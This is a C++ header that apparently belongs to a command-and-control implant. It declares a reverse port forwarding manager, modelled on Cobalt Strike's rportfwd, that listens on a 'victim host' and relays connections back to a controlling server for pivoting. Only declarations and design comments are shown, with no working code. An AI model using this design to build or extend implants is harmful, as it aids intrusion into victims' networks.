#pragma once
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

#include "Core/Comms/Platform/INetworkOps.hpp"

namespace cleat {

    /**
     * @brief 反向端口转发管理器(CS rportfwd 同类)
     *
     * 在受害主机上监听 listen_port; 每个入站连接生成全局唯一 conn id,
     * 以 PivotOpened 通告 Server(listen_port/target), Server 拨向真正的
     * 目标主机; 此后数据走既有 PivotData/PivotClose 双向透传(Agent 侧
     * 读写线程由 PivotManager::AdoptSocket 托管, 本类只管监听)。
     *
     * 生命周期: 监听器跨断线存续(CS 同类行为); Server 端 StopRportfwd
     * 会同时关闭该监听已产生的在途连接。StopAll 仅进程退出用。
     */
    class RportfwdManager {
    public:
        static RportfwdManager& Instance();

        // 启动监听; session_id 用于 conn id 全局唯一化。同端口重启会替换。
        // target 是 Server 侧视角的目标(Agent 不主动连目标)。
        bool Start(uint64_t session_id, uint16_t listen_port,
            const std::string& target_host, uint16_t target_port);

        // 停止监听(在途连接由 Server 侧按 listen_port 清理)。存在返回 true。
        bool Stop(uint16_t listen_port);

        void StopAll();

        struct Entry {
            uint16_t listen_port = 0;
            std::string target_host;
            uint16_t target_port = 0;
        };
        std::vector<Entry> List() const;
        size_t ActiveCount() const;

    private:
        RportfwdManager();
        ~RportfwdManager();
        RportfwdManager(const RportfwdManager&) = delete;
        RportfwdManager& operator=(const RportfwdManager&) = delete;

        void AcceptLoop(std::shared_ptr<struct RportfwdListener> lis);

        std::unique_ptr<INetworkOps> ops_;
        mutable std::mutex mutex_;
        std::unordered_map<uint16_t, std::shared_ptr<struct RportfwdListener>> listeners_;
        std::atomic<uint64_t> conn_seq_{ 0 };
    };

} // namespace cleat
